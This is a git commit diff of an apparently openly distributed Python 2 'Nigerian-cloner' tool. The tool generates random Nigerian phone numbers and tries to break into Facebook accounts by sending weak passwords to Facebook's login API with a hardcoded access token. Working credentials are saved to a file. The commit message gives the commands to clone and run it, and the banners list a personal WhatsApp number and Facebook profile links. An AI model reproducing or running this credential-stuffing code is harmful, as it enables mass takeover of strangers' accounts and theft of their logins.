8d75acb55e28c695d0f88564bda739b01162d37e
PY-14 <88144261+GUPTA-SHAKEL@users.noreply.github.com>
2021-08-29 16:59:09 +0100

    Update and rename Without.py to Nigerian-cloner.py
    git clone https://github.com/GUPTA-SHAKEL/MARK44.git
    ls
    cd MARK44
    ls
    python2 Nigerian-cloner.py

--- Nigerian-cloner.py
+++ Nigerian-cloner.py
@@ -1,15 +1,15 @@
-# Ustad#Mark Cornel#!/usr/bin/python2
+# Ustad# Mark# Thuglife# Majidyar# Gamz#!/usr/bin/python2
 #coding=utf-8
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(10000):
- 
+for n in range(100000):
+
     nmbr = random.randint(1111111, 9999999)
     
     sys.stdout = open('.txt', 'a')
- 
+
     print(nmbr)
- 
+
     sys.stdout.flush()
     
 try:
@@ -23,33 +23,33 @@ except ImportError:
     os.system('pip2 install request')
     time.sleep(1)
     os.system('Then type: python2 boss')
- 
+
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
- 
- 
+
+
 reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
- 
+br.addheaders = [('user-agent','Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
 def keluar():
 	print 'Thanks.'
 	os.sys.exit()
- 
+
 def acak(b):
     w = 'ahtdzjc'
     d = ''
     for i in x:
         d += '!'+w[random.randint(0,len(w)-1)]+i
     return cetak(d)
- 
- 
+
+
 def cetak(b):
     w = 'ahtdzjc'
     for i in w:
@@ -58,8 +58,8 @@ def cetak(b):
     x += '\033[0m'
     x = x.replace('!0','\033[0m')
     sys.stdout.write(x+'\n')
- 
- 
+
+
 def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
@@ -69,94 +69,64 @@ def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)
- 
- 
+
+
 back = 0
 oks = []
 id = []
 cpb = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
- 
+
 os.system("clear")
 print  """
-\033[1;96m\x1b[1;97m══
-
-╔═╗╔═╦═══╦═══╦╗╔═╗
-║║╚╝║║╔═╗║╔═╗║║║╔╝
-║╔╗╔╗║║─║║╚═╝║╚╝╝
-║║║║║║╚═╝║╔╗╔╣╔╗║
-║║║║║║╔═╗║║║╚╣║║╚╗
-╚╝╚╝╚╩╝─╚╩╝╚═╩╝╚═╝
-                                                 
-\033[1;97m\x1b[1;96m••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;91m\x1b[1;91m This Tool is only for Toppers
-                    
-\033[1;94m\x1b[1;94mfacebook    Mark Cornel
-                    
-\033[1;91m\x1b[1;95mWhatsap Number +2347013107449
-                     
-\x1b[1;94mTools Updated every week
-     \x1b[1;93m•••••••••••••••••••••••••••••••••••••      
-\033[1;96m.\x1b[1;92mNigerian Number Cloning 🇳🇬
-\033[1;97m••••••••••••••••••••••••••••••••••••••••••                
-\033[1;92m-\x1b[1;94mMark C--------------------------------------
+\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;92m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;92m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;95m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;95m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
 """
- 
+
 ####Logo####
- 
+
 logo1 = """
-\033[1;91m\x1b[1;94m
-
-
-
-
-\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;96m-\x1b[1;93mWithout login Tools..
-\033[1;97m❤️❤️❤️❤️❤️❤️❤️ ENJOY ❤️❤️❤️❤️❤️❤️❤️
-                     
-\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••
+\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;92m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;92m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;95m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;95m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
 """
 logo2 = """
-\033[1;91m\x1b[1;93m❤️❤️❤️USE 4G NETWORK ❤️❤️❤️❤️❤️
-
- 
-\033[1;97m•••••••••••••••••••Mark••••••••••••••••
-\033[1;97m•••• ••••••••••••••Cornel••••••••••••••    
- 
-                     
-\033[1;94mFACEBOOK-\x1b[1;94mMark Cornel
-                  
-                     
-\033[1;94mWHATAAPP \x1b[1;93m+2347013107449
-                      
-\033[1;97m•••••••••••••••••••••••••••••••••••••••••      
-\033[1;97m -\x1b[1;92mCrack Nigerian Numbers 
-\033[1;97m•••••••••••••••••••••••••••••••••••••••••      
-                                                
-\033[1;97m-----------\x1b[1;96mFamous-King-------------
+\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;92m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;92m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;95m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;95m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
 """
-CorrectUsername = "FAMOUS"
+CorrectUsername = "MEMO"
 CorrectPassword = "KING"
- 
+
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;97m\x1b[1;94mTool Username \x1b[1;92m»» \x1b[1;96m")
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Mark_Cornel
+            print "Logged in successfully as " + username #B1L4L
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://www.facebook.com/queeneth.amadi.3')
+            os.system('xdg-open https://www.facebook.com/Mark.Cornel666')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-openhttps://www.facebook.com/queeneth.amadi.3')
- 
- 
- 
+        os.system('xdg-open https://www.facebook.com/Mark.Cornel666')
+
+
+
 ##### LICENSE #####
 #=================#
 def lisensi():
@@ -166,15 +136,15 @@ def lisensi():
 def login():
     os.system('clear')
     print logo1
-    print "\033[1;91m[1]\x1b[1;96mCloning ( \033[1;92m menu)"
+    print "\033[1;91m[1]\x1b[1;91mSTART \033[1;92m (NOW)"
     time.sleep(0.05)
-    print "\033[1;95m[2]\x1b[1;96mupdate (9.0)"
+    print "\033[1;95m[2]\x1b[1;94mUPDATE (9.0)"
     time.sleep(0.05)
-    print '\x1b[1;94m[0]\033[1;96m Exit ( Back)'
+    print '\x1b[1;94m[0]\033[1;91m Exit (Back)'
     pilih_login()
- 
+
 def pilih_login():
-    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
+    peak = raw_input("\n\033[1;95m➤ \033[1;93m")
     if peak =="":
         print "\x1b[1;97mFill In Correctly"
         pilih_login()
@@ -183,27 +153,27 @@ def pilih_login():
 def Zeek():
     os.system('clear')
     print logo1
-    print '\x1b[1;95m[1]  start cracking'
+    print '\x1b[1;91m[1] START CLONING'
     time.sleep(0.10)
-    print '\x1b[1;94m[0] back'
+    print '\x1b[1;93m[0] BACK'
    
     time.sleep(0.05)
     action()
- 
+
 def action():
-    peak = raw_input('\n\033[1;97mCHOOSE:\033[1;97m')
+    peak = raw_input('\n\033[1;97mGUPTA➤\033[1;97m')
     if peak =='':
         print '[!] Fill In Correctly'
         action()
     elif peak =="1":              
         os.system("clear")
         print logo2
-        print "Wellcome to Mark Tools"+'\n'
-        print '\x1b[1;91mENTER ANY CODE 070,081,090,091,080'
-        print '\x1b[1;92mtelenor.\x1b[1;91mGLO.\x1b[1;93mMTN.\x1b[1;95mAirtel.9mobile'
+        print "Enter any Nigerian Mobile code Number"+'\n'
+        print '\x1b[1;91mEnter any SIM codes for Nigerians >> 090 , 080, 081, 070 091'
+        
         try:
-            c = raw_input("\033[1;97mCHOOSE : ")
-            k="03"
+            c = raw_input("\033[1;97mGUPTA➤")
+            k="+234"
             idlist = ('.txt')
             for line in open(idlist,"r").readlines():
                 id.append(line.strip())
@@ -218,10 +188,10 @@ def action():
         action()
     print 50* '\033[1;94m-'
     xxx = str(len(id))
-    jalan ('\033[1;93m Total ids number: '+xxx)
-    jalan ('\033[1;93mCode you choose: '+c)
+    jalan ('\033[1;91m Total ids number: '+xxx)
+    jalan ('\033[1;92mCode you choose: '+c)
     jalan ("\033[1;93mWait A While \x1b[1;94mStart Cracking...")
-    jalan ("\033[1;93mTo Stop Process Press Ctrl+z")
+    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
     print 50* '\033[1;97m-'
     def main(arg):
         global cpb,oks
@@ -235,14 +205,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;95m[MARK-OK]  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;95m(GUPTA-CP)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m(\x1b[MARK-CP] ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m(\x1b[1;95mCP) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -252,65 +222,65 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;91m[MARK-OK]  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;91m(GUPTA-OK)  ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m(\x1b[Rana cp] ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;97m(\x1b[1;93mCP) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
                             cpb.append(c+user+pass2)
                         else:
-                            pass3="445566"
+                            pass3="223344"
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;93m[MARK-OK]  ' + k + c + user + '  |  ' + pass3
+                                print '\x1b[1;93m(GUPTA-OK)  ' + k + c + user + '  |  ' + pass3
                                 okb = open('save/cloned.txt', 'a')
                                 okb.write(k+c+user+pass3+'\n')
                                 okb.close()
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m(\x1b[MARK-CP] ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;97m(\x1b[1;93mcp) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
                                     cpb.append(c+user+pass3)
                                 else:
-                                    pass4="112233"
+                                    pass4="334455"
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;93m[MARK-OK]  ' + k + c + user + '  |  ' + pass4 
+                                        print '\x1b[1;93m(GUPTA-OK)  ' + k + c + user + '  |  ' + pass4 
                                         okb = open('save/cloned.txt', 'a')
                                         okb.write(k+c+user+pass4+'\n')
                                         okb.close()
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m\x1b[1;93m[MARK-CP] ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;97m\x1b[1;93m(GUPTA-CP) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
                                             cpb.append(c+user+pass4)
                                         else:
-                                            pass5="223344"
+                                            pass5="445566"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                print '\x1b[1;93m[MARK-OK]  ' + k + c + user + '  |  ' + pass5
+                                                print '\x1b[1;93m(GUPTA-OK)  ' + k + c + user + '  |  ' + pass5
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass5+'\n')
                                                 okb.close()
                                                 oks.append(c+user+pass5)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m\x1b[1;94m[MARK-CP] ' + k + c + user + '  |  ' + pass5 
+                                                    print '\033[1;97m\x1b[1;94m(GUPTA-CP) ' + k + c + user + '  |  ' + pass5 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
@@ -322,14 +292,14 @@ def action():
                                                                                                                                                                                                             
                                                                                                                                                                                                             
                                                                                                                                                                                                             
- 
- 
+
+
                                                                                                                                                                                                             
                                                                                                                                                                                                                     
                                                                                                                                                                                                             
- 
- 
- 
+
+
+
         except:
             pass
         
@@ -339,17 +309,16 @@ def action():
     print 'Process Has Been Completed ...'
     print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
     print('Cloned Accounts Has Been Saved : save/cloned.txt')
-    jalan("Note : Your Offline account Will Open after 10 to 20 days")
+    jalan("Note : Your Offline account Will Open after 8 to 10 days")
     print ''
     print """
-\033[1;96mThanks for using Mark Cornel Tool
-\033[1;95mFb\033[1;97mMark Cornel
+    ███
+──────────███║GUPTA║\033[1;95mFb\033[1;97m 
 \033[1;95m033[1;97m"""
- 
+
     
     raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
     login() 
           
 if __name__ == '__main__':
     login()
- 
